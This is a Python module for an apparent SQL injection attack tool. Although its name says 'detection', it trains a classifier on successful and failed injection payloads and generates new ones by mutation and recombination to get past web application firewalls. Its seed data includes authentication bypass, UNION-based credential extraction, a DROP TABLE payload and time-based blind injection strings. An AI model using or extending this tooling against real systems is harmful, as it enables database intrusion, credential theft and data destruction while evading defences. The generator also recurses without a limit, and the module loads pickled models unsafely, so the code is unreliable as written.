#!/usr/bin/env python3
# Machine Learning-Based Detection Module
# Learns from successful SQL injections to automatically generate and optimize new payloads

import os
import sys
import json
import pickle
import random
import numpy as np
import logging
from datetime import datetime
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.ensemble import RandomForestClassifier
from sklearn.naive_bayes import MultinomialNB
from sklearn.pipeline import Pipeline
from sklearn.model_selection import train_test_split

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('ml_detection')

class MLDetection:
    """
    Machine Learning module for SQL injection detection and payload generation
    """
    def __init__(self, config):
        """Initialize the ML module with configuration"""
        self.config = config
        self.model_path = config.get('model_path', 'models/ml_model.pkl')
        self.training_data_path = config.get('training_data', 'data/ml_training_data.json')
        self.threshold = config.get('threshold', 0.75)
        
        # Create directories if they don't exist
        os.makedirs(os.path.dirname(self.model_path), exist_ok=True)
        os.makedirs(os.path.dirname(self.training_data_path), exist_ok=True)
        
        # Initialize model and data
        self.model = None
        self.training_data = self._load_training_data()
        
        # Load or train model
        if os.path.exists(self.model_path):
            self._load_model()
        else:
            self._train_model()
            
        logger.info("Machine Learning Detection module initialized")
        
    def _load_training_data(self):
        """Load training data from file or create default"""
        if os.path.exists(self.training_data_path):
            try:
                with open(self.training_data_path, 'r') as f:
                    data = json.load(f)
                    logger.info(f"Training data loaded from {self.training_data_path}")
                    return data
            except Exception as e:
                logger.error(f"Error loading training data: {e}")
                
        # Create default training data
        data = {
            "successful_payloads": [
                {"payload": "' OR 1=1--", "context": "login", "db_type": "mysql", "waf_bypassed": None},
                {"payload": "1' OR '1'='1", "context": "search", "db_type": "mysql", "waf_bypassed": None},
                {"payload": "1; DROP TABLE users--", "context": "id", "db_type": "mssql", "waf_bypassed": None},
                {"payload": "' UNION SELECT username,password FROM users--", "context": "product", "db_type": "mysql", "waf_bypassed": None},
                {"payload": "' AND (SELECT 6765 FROM (SELECT(SLEEP(5)))bAKL)--", "context": "page", "db_type": "mysql", "waf_bypassed": None}
            ],
            "failed_payloads": [
                {"payload": "SELECT * FROM users", "context": "login", "db_type": "mysql", "reason": "syntax"},
                {"payload": "' OR 1=1", "context": "search", "db_type": "mysql", "reason": "incomplete"},
                {"payload": "'", "context": "id", "db_type": "mysql", "reason": "too_simple"},
                {"payload": "' --", "context": "product", "db_type": "mysql", "reason": "incomplete"}
            ],
            "metadata": {
                "version": "1.0.0",
                "created": datetime.now().isoformat(),
                "last_updated": datetime.now().isoformat()
            }
        }
        
        # Save default training data
        try:
            with open(self.training_data_path, 'w') as f:
                json.dump(data, f, indent=2)
                logger.info(f"Default training data created at {self.training_data_path}")
        except Exception as e:
            logger.error(f"Error saving default training data: {e}")
            
        return data
        
    def _prepare_training_data(self):
        """Prepare training data for model"""
        X = []  # Payloads
        y = []  # Labels (1 for successful, 0 for failed)
        
        # Add successful payloads
        for item in self.training_data.get('successful_payloads', []):
            X.append(item['payload'])
            y.append(1)
            
        # Add failed payloads
        for item in self.training_data.get('failed_payloads', []):
            X.append(item['payload'])
            y.append(0)
            
        return X, y
        
    def _train_model(self):
        """Train the machine learning model"""
        X, y = self._prepare_training_data()
        
        if not X or len(X) < 5:
            logger.warning("Not enough training data, using default model")
            self.model = self._create_default_model()
            return
            
        try:
            # Split data for training and testing
            X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
            
            # Create pipeline with TF-IDF and Random Forest
            pipeline = Pipeline([
                ('tfidf', TfidfVectorizer(analyzer='char', ngram_range=(1, 5))),
                ('clf', RandomForestClassifier(n_estimators=100, random_state=42))
            ])
            
            # Train model
            pipeline.fit(X_train, y_train)
            
            # Evaluate model
            accuracy = pipeline.score(X_test, y_test)
            logger.info(f"Model trained with accuracy: {accuracy:.2f}")
            
            # Save model
            self.model = pipeline
            self._save_model()
            
        except Exception as e:
            logger.error(f"Error training model: {e}")
            self.model = self._create_default_model()
            
    def _create_default_model(self):
        """Create a default model when training fails"""
        pipeline = Pipeline([
            ('tfidf', TfidfVectorizer(analyzer='char', ngram_range=(1, 5))),
            ('clf', MultinomialNB())
        ])
        
        # Create minimal training data
        X = ["' OR 1=1--", "1' OR '1'='1", "SELECT * FROM users", "'"]
        y = [1, 1, 0, 0]
        
        # Train on minimal data
        pipeline.fit(X, y)
        return pipeline
        
    def _save_model(self):
        """Save model to file"""
        try:
            with open(self.model_path, 'wb') as f:
                pickle.dump(self.model, f)
                logger.info(f"Model saved to {self.model_path}")
        except Exception as e:
            logger.error(f"Error saving model: {e}")
            
    def _load_model(self):
        """Load model from file"""
        try:
            with open(self.model_path, 'rb') as f:
                self.model = pickle.load(f)
                logger.info(f"Model loaded from {self.model_path}")
        except Exception as e:
            logger.error(f"Error loading model: {e}")
            self._train_model()  # Fallback to training
            
    def predict_payload_success(self, payload):
        """Predict if a payload will be successful"""
        if not self.model:
            logger.warning("No model available")
            return 0.5
            
        try:
            # Predict probability
            prob = self.model.predict_proba([payload])[0][1]  # Probability of class 1 (success)
            return prob
        except Exception as e:
            logger.error(f"Error predicting payload success: {e}")
            return 0.5
            
    def add_training_example(self, payload, success, context=None, db_type=None, waf_bypassed=None, reason=None):
        """Add a new training example"""
        example = {
            "payload": payload,
            "context": context,
            "db_type": db_type
        }
        
        if success:
            example["waf_bypassed"] = waf_bypassed
            self.training_data.get('successful_payloads', []).append(example)
        else:
            example["reason"] = reason
            self.training_data.get('failed_payloads', []).append(example)
            
        # Update metadata
        self.training_data["metadata"]["last_updated"] = datetime.now().isoformat()
        
        # Save training data
        try:
            with open(self.training_data_path, 'w') as f:
                json.dump(self.training_data, f, indent=2)
                logger.info(f"Training data updated with new example")
            
            # Retrain model if we have enough new data
            if len(self.training_data.get('successful_payloads', [])) % 10 == 0:
                logger.info("Retraining model with new data")
                self._train_model()
                
            return True
        except Exception as e:
            logger.error(f"Error updating training data: {e}")
            return False
            
    def generate_payload(self, context=None, db_type=None, waf_type=None):
        """Generate a new payload based on learned patterns"""
        if not self.model:
            logger.warning("No model available for payload generation")
            return None
            
        # Filter successful payloads by context and db_type if provided
        relevant_payloads = self.training_data.get('successful_payloads', [])
        
        if context:
            relevant_payloads = [p for p in relevant_payloads if p.get('context') == context]
            
        if db_type:
            relevant_payloads = [p for p in relevant_payloads if p.get('db_type') == db_type]
            
        if waf_type:
            # Get payloads that bypassed this WAF or None (could work)
            relevant_payloads = [p for p in relevant_payloads if p.get('waf_bypassed') == waf_type or p.get('waf_bypassed') is None]
            
        if not relevant_payloads:
            logger.warning(f"No relevant payloads found for context={context}, db_type={db_type}, waf_type={waf_type}")
            # Fall back to all successful payloads
            relevant_payloads = self.training_data.get('successful_payloads', [])
            
        if not relevant_payloads:
            return None
            
        # Different payload generation strategies
        generation_strategy = random.choice(['mutate', 'combine', 'sample'])
        
        if generation_strategy == 'sample':
            # Sample from existing successful payloads
            payload = random.choice(relevant_payloads)['payload']
            
        elif generation_strategy == 'mutate':
            # Mutate an existing payload
            base_payload = random.choice(relevant_payloads)['payload']
            payload = self._mutate_payload(base_payload)
            
        elif generation_strategy == 'combine':
            # Combine elements from different payloads
            if len(relevant_payloads) < 2:
                payload = relevant_payloads[0]['payload']
            else:
                payload1 = random.choice(relevant_payloads)['payload']
                payload2 = random.choice(relevant_payloads)['payload']
                payload = self._combine_payloads(payload1, payload2)
                
        # Check if generated payload is predicted to be successful
        prediction = self.predict_payload_success(payload)
        
        if prediction >= self.threshold:
            logger.info(f"Generated payload with success probability: {prediction:.2f}")
            return payload
        else:
            # Try again with a different strategy
            return self.generate_payload(context, db_type, waf_type)
            
    def _mutate_payload(self, payload):
        """Mutate a payload by making small changes"""
        mutation_type = random.choice(['case', 'whitespace', 'comment', 'encoding', 'logic'])
        
        if mutation_type == 'case':
            # Change case of random characters
            result = ""
            for char in payload:
                if random.random() < 0.3:  # 30% chance to change case
                    result += char.swapcase()
                else:
                    result += char
            return result
            
        elif mutation_type == 'whitespace':
            # Add or remove whitespace
            spaces = [' ', '\t', '+', '%20']
            result = ""
            for i, char in enumerate(payload):
                if char == ' ':
                    # Replace space with different whitespace
                    result += random.choice(spaces)
                elif random.random() < 0.2 and char not in "'\"":
                    # Add random whitespace
                    result += random.choice(spaces) + char
                else:
                    result += char
            return result
            
        elif mutation_type == 'comment':
            # Add SQL comments
            comments = ['/**/', '/*comment*/', '--', '#']
            comment = random.choice(comments)
            
            # Insert comment at random position
            pos = random.randint(0, len(payload))
            return payload[:pos] + comment + payload[pos:]
            
        elif mutation_type == 'encoding':
            # Encode a part of the payload
            if "'" in payload:
                return payload.replace("'", "%27", 1)
            elif '"' in payload:
                return payload.replace('"', "%22", 1)
            else:
                # Unicode encoding for a random character
                char_pos = random.randint(0, len(payload) - 1)
                char = payload[char_pos]
                unicode_char = f"\\u00{ord(char):02x}"
                return payload[:char_pos] + unicode_char + payload[char_pos + 1:]
                
        elif mutation_type == 'logic':
            # Modify logic expressions
            if "1=1" in payload:
                replacements = ["1=1", "2=2", "True", "'A'='A'", "1 LIKE 1"]
                return payload.replace("1=1", random.choice(replacements))
            elif "OR" in payload:
                return payload.replace("OR", random.choice(["OR", "||"]))
            elif "AND" in payload:
                return payload.replace("AND", random.choice(["AND", "&&"]))
            else:
                return payload
                
        return payload
        
    def _combine_payloads(self, payload1, payload2):
        """Combine elements from two payloads"""
        # Simple case: take prefix from one, suffix from another
        if len(payload1) > 3 and len(payload2) > 3:
            split_point1 = len(payload1) // 2
            split_point2 = len(payload2) // 2
            
            # Different combination strategies
            strategy = random.choice(['prefix-suffix', 'alternate', 'nested'])
            
            if strategy == 'prefix-suffix':
                return payload1[:split_point1] + payload2[split_point2:]
                
            elif strategy == 'alternate':
                # Alternate characters or small chunks
                chunk_size = random.randint(1, 3)
                result = ""
                for i in range(0, max(len(payload1), len(payload2)), chunk_size):
                    if i < len(payload1):
                        result += payload1[i:i+chunk_size]
                    if i < len(payload2):
                        result += payload2[i:i+chunk_size]
                return result
                
            elif strategy == 'nested':
                # Nest one payload inside another
                nest_point = random.randint(0, len(payload1))
                return payload1[:nest_point] + payload2 + payload1[nest_point:]
                
        return payload1 + payload2
        
    def get_training_stats(self):
        """Get statistics about the training data"""
        stats = {
            "successful_payloads": len(self.training_data.get('successful_payloads', [])),
            "failed_payloads": len(self.training_data.get('failed_payloads', [])),
            "last_updated": self.training_data.get('metadata', {}).get('last_updated'),
            "model_accuracy": None,
            "contexts": {},
            "db_types": {}
        }
        
        # Count occurrences of contexts and db_types
        for payload in self.training_data.get('successful_payloads', []):
            context = payload.get('context')
            db_type = payload.get('db_type')
            
            if context:
                stats['contexts'][context] = stats['contexts'].get(context, 0) + 1
            if db_type:
                stats['db_types'][db_type] = stats['db_types'].get(db_type, 0) + 1
                
        # Evaluate model if available
        if self.model:
            X, y = self._prepare_training_data()
            if X and y:
                try:
                    stats['model_accuracy'] = self.model.score(X, y)
                except:
                    pass
                    
        return stats

if __name__ == "__main__":
    # Simple test/demo
    config = {
        'model_path': 'models/ml_model.pkl',
        'training_data': 'data/ml_training_data.json',
        'threshold': 0.75
    }
    
    ml_detector = MLDetection(config)
    
    # Generate some payloads
    print("Generating payloads:")
    for _ in range(3):
        payload = ml_detector.generate_payload(db_type="mysql")
        if payload:
            prob = ml_detector.predict_payload_success(payload)
            print(f"- {payload} (probability: {prob:.2f})")
            
    # Print stats
    print("\nTraining data stats:")
    stats = ml_detector.get_training_stats()
    for key, value in stats.items():
        if not isinstance(value, dict):
            print(f"- {key}: {value}")
